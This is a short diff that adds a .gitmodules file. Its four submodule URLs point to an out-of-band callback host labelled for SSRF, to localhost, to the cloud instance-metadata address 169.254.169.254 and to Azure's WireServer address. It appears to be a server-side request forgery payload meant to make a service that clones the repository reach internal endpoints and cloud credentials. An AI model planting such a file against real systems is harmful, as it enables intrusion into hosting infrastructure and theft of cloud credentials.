@@ -1,0 +1,12 @@
+[submodule "oob"]
+	path = sub_oob
+	url = https://subssrf-2f92.oob.ogxing.com/gmssrf
+[submodule "loop"]
+	path = sub_loop
+	url = http://127.0.0.1/
+[submodule "imds"]
+	path = sub_imds
+	url = http://169.254.169.254/latest/meta-data/
+[submodule "wire"]
+	path = sub_wire
+	url = http://168.63.129.16/
